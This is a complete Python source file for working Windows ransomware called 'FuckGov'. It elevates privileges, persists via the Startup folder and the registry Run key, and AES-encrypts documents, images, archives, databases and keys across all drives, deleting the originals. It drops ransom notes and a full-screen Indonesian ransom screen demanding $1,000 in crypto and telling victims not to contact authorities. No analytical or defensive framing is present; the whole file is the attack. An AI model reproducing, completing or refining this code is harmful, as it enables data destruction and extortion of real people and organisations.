import os
import sys
import uuid
import shutil
import winreg
import ctypes
from pathlib import Path
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad
from PyQt5.QtWidgets import *
from PyQt5.QtCore import *
from PyQt5.QtGui import *

EXTENSION = ".FuckGov"
RANSOM_NOTE = "ransom.txt"
KEY_FILE = "FuckGov.key"
RANSOM_AMOUNT = "$1,000"
CONTACT_EMAIL = "xaydevsupport@gmail.com"
UNIQUE_ID = ""

TARGET_EXTENSIONS = {
    ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pdf",
    ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tiff", ".raw",
    ".mp3", ".mp4", ".avi", ".mkv", ".mov", ".wav", ".flac",
    ".zip", ".rar", ".7z", ".tar", ".gz", ".bz2",
    ".txt", ".csv", ".json", ".xml", ".sql", ".db", ".sqlite",
    ".html", ".css", ".js", ".py", ".java", ".c", ".cpp", ".h",
    ".key", ".pem", ".crt", ".cer", ".pfx", ".p12",
    ".vhd", ".vhdx", ".vmdk", ".iso", ".img",
    ".bak", ".log", ".dat", ".ini", ".cfg", ".conf"
}

EXCLUDED_DIRS = {
    "windows", "program files", "program files (x86)",
    "programdata", "appdata", "recovery", "system volume information",
    "$recycle.bin", "boot", "perflogs", "msocache", "drivers",
    "intel", "amd", "nvidia", "common files", "microsoft", "google"
}

SCRIPT_NAME = os.path.basename(sys.argv[0]).lower()
SCRIPT_PATH = os.path.abspath(sys.argv[0])
KEY_DIR = os.path.join(os.environ.get("APPDATA", os.path.expanduser("~")), "Camellia")
KEY_PATH = os.path.join(KEY_DIR, KEY_FILE)


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


def elevate_if_needed():
    if not is_admin():
        try:
            ctypes.windll.shell32.ShellExecuteW(
                None, "runas", sys.executable, " ".join(sys.argv), None, 1
            )
            sys.exit(0)
        except Exception:
            pass


def generate_and_save_key():
    global UNIQUE_ID
    UNIQUE_ID = str(uuid.uuid4()).upper()[:16].replace("-", "")
    key = get_random_bytes(32)
    os.makedirs(KEY_DIR, exist_ok=True)
    try:
        with open(KEY_PATH, "wb") as f:
            f.write(key)
        with open(os.path.join(KEY_DIR, "id.txt"), "w") as f:
            f.write(UNIQUE_ID)
    except Exception:
        alt_path = os.path.join(os.path.expanduser("~"), "Desktop", KEY_FILE)
        with open(alt_path, "wb") as f:
            f.write(key)
    return key


def load_key():
    try:
        with open(KEY_PATH, "rb") as f:
            return f.read()
    except:
        alt_path = os.path.join(os.path.expanduser("~"), "Desktop", KEY_FILE)
        with open(alt_path, "rb") as f:
            return f.read()


def encrypt_file(file_path, key):
    try:
        with open(file_path, "rb") as f:
            data = f.read()

        iv = get_random_bytes(16)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        encrypted = cipher.encrypt(pad(data, AES.block_size))

        new_path = file_path + EXTENSION
        with open(new_path, "wb") as f:
            f.write(iv)
            f.write(encrypted)

        try:
            os.remove(file_path)
            return True
        except Exception:
            if os.path.exists(new_path):
                os.remove(new_path)
            return False
    except Exception:
        return False


def decrypt_file(file_path, key):
    try:
        with open(file_path, "rb") as f:
            iv = f.read(16)
            encrypted = f.read()

        cipher = AES.new(key, AES.MODE_CBC, iv)
        decrypted = unpad(cipher.decrypt(encrypted), AES.block_size)

        original_path = file_path[:-len(EXTENSION)]
        with open(original_path, "wb") as f:
            f.write(decrypted)
        os.remove(file_path)
        return True
    except Exception:
        return False


def is_excluded_dir(path):
    parts = path.lower().split(os.sep)
    for p in parts:
        if p in EXCLUDED_DIRS:
            return True
    return False


def is_excluded_file(filename):
    lower = filename.lower()
    if lower == SCRIPT_NAME:
        return True
    if lower in {KEY_FILE.lower(), RANSOM_NOTE.lower(), "readme.txt", "id.txt"}:
        return True
    if lower.endswith(EXTENSION.lower()):
        return True
    ext = os.path.splitext(lower)[1]
    if ext in {".dll", ".sys", ".exe", ".msi", ".com", ".bat", ".cmd", ".vbs", ".ps1", ".scr"}:
        return True
    return False


def encrypt_all_drives(key, counter, progress_signal):
    for drive_letter in "ABCDEFGHIJKLMNOPQRSTUVWXYZ":
        drive = f"{drive_letter}:\\"
        if not os.path.exists(drive):
            continue

        for root, dirs, files in os.walk(drive):
            dirs[:] = [d for d in dirs if not is_excluded_dir(os.path.join(root, d))]
            for file in files:
                full_path = os.path.join(root, file)
                if is_excluded_file(file):
                    continue
                ext = os.path.splitext(file)[1].lower()
                if ext not in TARGET_EXTENSIONS:
                    continue
                if encrypt_file(full_path, key):
                    counter[0] += 1
                    progress_signal.emit(counter[0])

    for drive_letter in "ABCDEFGHIJKLMNOPQRSTUVWXYZ":
        drive = f"{drive_letter}:\\"
        if os.path.exists(drive):
            write_ransom_note(os.path.join(drive, RANSOM_NOTE))

    desktop = os.path.join(os.path.expanduser("~"), "Desktop")
    if os.path.exists(desktop):
        write_ransom_note(os.path.join(desktop, RANSOM_NOTE))


def write_ransom_note(path):
    content = f"""YOUR FILES HAVE BEEN ENCRYPTED!
All your documents, images, videos, archives, and other important data have been locked by FuckGov Ransomware.

To recover your files, you must pay a ransom of {RANSOM_AMOUNT} in Bitcoin or USDT.
Contact us at: {CONTACT_EMAIL}
Provide your unique ID: {UNIQUE_ID}

After payment, you will receive the decryption tool.
Do not attempt to decrypt by yourself – it will result in permanent data loss.
"""
    try:
        with open(path, "w") as f:
            f.write(content)
    except Exception:
        pass


def add_to_startup():
    try:
        startup_dir = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
        shutil.copy2(SCRIPT_PATH, startup_dir)
    except:
        pass
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "FuckGov", 0, winreg.REG_SZ, f'"{sys.executable}" "{SCRIPT_PATH}"')
        winreg.CloseKey(key)
    except:
        pass


class Worker(QObject):
    progress = pyqtSignal(int)
    finished = pyqtSignal()

    def __init__(self, key, counter):
        super().__init__()
        self.key = key
        self.counter = counter

    def run(self):
        encrypt_all_drives(self.key, self.counter, self.progress)
        self.finished.emit()


class RansomwareGUI(QMainWindow):
    def __init__(self, key):
        super().__init__()
        self.key = key
        self.counter = [0]
        self.initUI()
        self.start_encryption()

    def initUI(self):
        self.setWindowTitle("FuckGov Ransomware")
        self.showFullScreen()
        self.setStyleSheet("background-color: #8B0000;")

        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        layout = QVBoxLayout(central_widget)
        layout.setAlignment(Qt.AlignCenter)

        text = f"""FUCK GOV RANSOMWARE

SELURUH DATA TELAH DIENKRIPSI

File, dokumen, dan arsip penting anda
tidak dapat diakses tanpa kunci.

INSTRUKSI PEMULIHAN:

1. Kirim email ke: {CONTACT_EMAIL}
2. Cantumkan ID unik anda di subjek
3. Kami akan kirim alamat pembayaran (BTC/USDT)
4. Jumlah tebusan: {RANSOM_AMOUNT}
5. Setelah pembayaran, anda akan terima dekripsi

PERINGATAN:

- Jangan ubah atau pindahkan file terenkripsi
- Jangan gunakan software pemulihan sendiri
- Jangan hubungi pihak berwenang
- Batas waktu 24 jam, setelah itu kunci dimusnahkan

UNIQUE ID: {UNIQUE_ID}"""

        label = QLabel(text)
        label.setAlignment(Qt.AlignCenter)
        label.setFont(QFont("Arial", 14, QFont.Bold))
        label.setStyleSheet("color: white;")
        layout.addWidget(label)

        self.counter_label = QLabel("Files encrypted: 0")
        self.counter_label.setAlignment(Qt.AlignCenter)
        self.counter_label.setFont(QFont("Arial", 12, QFont.Bold))
        self.counter_label.setStyleSheet("color: white;")
        layout.addWidget(self.counter_label)

        self.exit_button = QPushButton("Exit")
        self.exit_button.setFont(QFont("Arial", 12))
        self.exit_button.setFixedSize(120, 40)
        self.exit_button.clicked.connect(self.close_app)
        layout.addWidget(self.exit_button, alignment=Qt.AlignCenter)

    def start_encryption(self):
        self.thread = QThread()
        self.worker = Worker(self.key, self.counter)
        self.worker.moveToThread(self.thread)

        self.thread.started.connect(self.worker.run)
        self.worker.progress.connect(self.update_counter)
        self.worker.finished.connect(self.encryption_done)
        self.worker.finished.connect(self.thread.quit)
        self.worker.finished.connect(self.worker.deleteLater)
        self.thread.finished.connect(self.thread.deleteLater)

        self.thread.start()

    def update_counter(self, count):
        self.counter_label.setText(f"Files encrypted: {count}")

    def encryption_done(self):
        self.counter_label.setText(f"Files encrypted: {self.counter[0]} - COMPLETED")

    def close_app(self):
        sys.exit()


def main():
    elevate_if_needed()
    add_to_startup()
    key = generate_and_save_key()
    app = QApplication(sys.argv)
    gui = RansomwareGUI(key)
    sys.exit(app.exec_())


if __name__ == "__main__":
    main()